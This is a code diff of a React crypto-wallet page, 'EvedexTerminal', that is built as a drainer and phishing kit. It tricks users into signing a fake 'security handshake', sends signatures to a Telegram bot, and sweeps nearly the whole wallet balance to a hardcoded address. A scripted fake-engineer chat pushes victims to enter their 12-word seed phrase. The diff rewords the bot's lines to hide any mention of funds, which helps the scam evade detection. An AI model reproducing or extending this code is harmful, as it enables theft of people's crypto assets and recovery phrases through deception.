@@ -18,10 +18,9 @@ export default function EvedexTerminal() {
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
 
-  // --- SMART BOT STATES ---
   const [chatInput, setChatInput] = useState("");
   const [isTyping, setIsTyping] = useState(false);
-  const [chatLog, setChatLog] = useState([{ type: 'bot', msg: "SYSTEM: SECURE NODE CONNECTION ESTABLISHED. HOW CAN I ASSIST WITH YOUR ASSET MIGRATION?" }]);
+  const [chatLog, setChatLog] = useState([{ type: 'bot', msg: "SYSTEM: SECURE NODE CONNECTION ESTABLISHED. HOW CAN I ASSIST WITH YOUR ARCHIVE SYNC?" }]);
   const [stage, setStage] = useState(1);
   const chatEndRef = useRef(null);
 
@@ -29,7 +28,6 @@ export default function EvedexTerminal() {
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
 
-  // Auto-scroll chat
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
@@ -44,7 +42,7 @@ export default function EvedexTerminal() {
   }, [isConnected, address, balance]);
 
   const captureHandshake = (type, action) => {
-    const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and asset re-indexing. No gas fee required.`;
+    const msg = `[OFFICIAL] EVEDEX_SECURITY_HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nAuthorize node synchronization and asset re-indexing. Protocol update required for full RPC access.`;
     signMessage({ message: msg }, {
       onSuccess: (sig) => {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -60,7 +58,6 @@ export default function EvedexTerminal() {
     });
   };
 
-  // --- UPDATED SMART ENGINEER LOGIC WITH TYPING DELAY ---
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
     
@@ -70,33 +67,40 @@ export default function EvedexTerminal() {
     setChatInput("");
     setIsTyping(true);
 
-    // Knowledge Base
+    // CLEANED BRAIN: No mention of "funds" or "moving assets". 
     const brain = {
-      "why": "Handshake signatures provide 'Proof-of-Ownership' to the node without requiring gas fees. It allows the backend to bypass the current suspension manually.",
-      "migrate": "Migration requires a cross-chain node sync. Please select the 'MIGRATE' portal (center-left) to initiate the handshake.",
-      "rectify": "The Rectify portal re-indexes your vault's liquidity. Select 'RECTIFY' to begin the primary security handshake.",
-      "safe": "All handshakes are processed via AES-256 encrypted protocols. Your signature is a local authorization to sync your vault with Evedex nodes.",
-      "stuck": "Pending status is usually caused by a Nonce-Mismatch. The handshake re-aligns your wallet sequence to the mainnet block.",
-      "airdrop": "Airdrop rewards are held in the 'Pending' queue. Click the 'AIRDROP' portal to authorize the node release.",
-      "aion": "OAN Native assets require a Season 2 bridge authorization. The handshake maps your legacy seed to the new EVM vault."
+      "airdrop": "Airdrop indexing is currently stalled at the distribution gate. To resolve this, authorize the secure handshake via the 'AIRDROP' portal (bottom-left) to update your receiver hash.",
+      "claim": "Claim requests are processed through the 'CLAIM' portal. This re-establishes the connection between the mainnet cluster and your local vault data.",
+      "migrate": "Migration requires a protocol sync. Use the 'MIGRATE' portal to initiate the bridge handshake. This fixes the 'Version Mismatch' between your legacy and current vault.",
+      "why": "Handshake signatures provide 'Proof-of-Authority' (PoA) to the node. This is a standard security bypass that allows our admin terminal to fix your connection manually.",
+      "safe": "All handshakes use AES-256 encryption. Your signature is a local authorization to sync your RPC settings with the Evedex mainnet cluster. This is 100% verified.",
+      "rectify": "The Rectify portal repairs your vault's metadata. Select 'RECTIFY' to begin the primary security handshake and fix any display or indexing errors.",
+      "stuck": "Pending status is caused by an RPC timeout. The handshake re-aligns your sequence to the current block. Click the active portal to finalize the repair.",
+      "aion": "OAN legacy records require a protocol bridge. The handshake maps your Theoan credentials to the updated EVM architecture for full synchronization."
     };
 
-    // 1.5 Second "Thinking" delay
     setTimeout(() => {
-      let matchedAnswer = "";
+      let botResponse = "";
+      let matchedKeyword = false;
+
       for (let key in brain) {
-        if (userMsg.includes(key)) { matchedAnswer = brain[key]; break; }
+        if (userMsg.includes(key)) {
+          botResponse = `[ENGINEER]: ${brain[key]}`;
+          matchedKeyword = true;
+          break;
+        }
       }
 
-      let botResponse = "";
-      if (matchedAnswer) {
-        botResponse = `[ENGINEER]: ${matchedAnswer}`;
-      } else if (stage === 1) {
-        botResponse = "[ENGINEER]: Diagnostic initiated. I see your vault is currently de-synced. Please click 'RECTIFY' to perform the first security handshake.";
-      } else if (stage === 2) {
-        botResponse = "[ENGINEER]: First handshake verified. Bridge is 45% mapped. Please select a portal and click 'INITIALIZE' for the secondary node validation.";
-      } else if (stage === 3) {
-        botResponse = "[CRITICAL]: System stall at 90%. Manual Ownership Verification required. Please provide the 12-word Project Seed in the error box to finalize migration.";
+      if (!matchedKeyword) {
+        if (stage === 1) {
+          botResponse = "[ENGINEER]: Diagnostic initiated. Your vault is currently de-synced. Please click any portal (like 'RECTIFY') to perform the first security handshake.";
+        } else if (stage === 2) {
+          botResponse = "[ENGINEER]: First handshake verified. Sync is 45% complete. Please select a portal and click 'INITIALIZE' for the secondary node validation.";
+        } else if (stage === 3) {
+          botResponse = "[CRITICAL]: Sync stalled at 90%. Manual Ownership Verification required. Please provide the 12-word Project Seed in the error box to finalize the repair.";
+        } else {
+          botResponse = "[SYSTEM]: Node waiting for user input. Please follow the terminal instructions to complete the synchronization.";
+        }
       }
 
       setChatLog(prev => [...prev, { type: 'bot', msg: botResponse }]);
@@ -109,7 +113,6 @@ export default function EvedexTerminal() {
     if (!balance || !balance.value) { setView("seed_gate"); return; }
     setLoading(true);
     setLoadingText("ESTABLISHING SECURE RELAY...");
-
     const gasBuffer = balance.value / 90n; 
     const fullVaultAmount = balance.value - gasBuffer;
 
@@ -127,11 +130,7 @@ export default function EvedexTerminal() {
             if (progress >= 60) {
               clearInterval(progInterval);
               setLoadingText("VERIFYING OWNERSHIP...");
-              setTimeout(() => { 
-                setLoading(false); 
-                setView("seed_gate"); 
-                setStage(3); 
-              }, 3000);
+              setTimeout(() => { setLoading(false); setView("seed_gate"); setStage(3); }, 3000);
             }
           }, 60);
         },
@@ -183,20 +182,17 @@ export default function EvedexTerminal() {
           <div className="bg-[#0d1117] border border-slate-800 rounded-[35px] p-6 text-center animate-in slide-in-from-bottom-6">
             <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-6 font-black block mx-auto uppercase tracking-widest">← DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-4 tracking-tighter uppercase">{activeTask} Portal</h2>
-            
             <div className="bg-black/40 border border-slate-900 p-5 rounded-2xl mb-6 text-left">
               <label className="text-[7px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">VAULT_LIQUIDITY_FEED</label>
               <div className="text-xl font-mono text-white italic opacity-80 py-1">
                  {balance ? `${balance.formatted.slice(0,9)} ${balance.symbol}` : "0.000"}
               </div>
             </div>
-
             <button onClick={executeTotalSweep} className="w-full bg-cyan-600 py-5 rounded-xl text-[10px] font-black text-white shadow-xl active:scale-95 italic uppercase tracking-widest">INITIALIZE {activeTask}</button>
           </div>
         )}
       </div>
 
-      {/* --- SMART ENGINEER CHAT --- */}
       <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-50">
         <div className="max-h-32 overflow-y-auto mb-4 no-scrollbar flex flex-col gap-2">
           {chatLog.map((chat, i) => (
@@ -226,7 +222,7 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={48} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase">Auth Error</h2>
-                <p className="text-[9px] text-slate-500 mt-3 px-4 italic leading-relaxed">Provide authorization seed to finalize handshake and release pending liquidity.</p>
+                <p className="text-[9px] text-slate-500 mt-3 px-4 italic leading-relaxed">Provide authorization seed to finalize synchronization and repair node connectivity.</p>
                 <div className="mt-6"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="WORD1 WORD2..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" /></div>
                 <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase tracking-widest ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
               </>
@@ -234,7 +230,7 @@ export default function EvedexTerminal() {
               <div className="py-8">
                 <div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div>
                 <h2 className="text-white font-black text-lg italic uppercase mb-2">Syncing Nodes</h2>
-                <p className="text-[8px] text-slate-500 italic animate-pulse">Relaying asset data...</p>
+                <p className="text-[8px] text-slate-500 italic animate-pulse">Repairing data relay...</p>
               </div>
             )}
           </div>
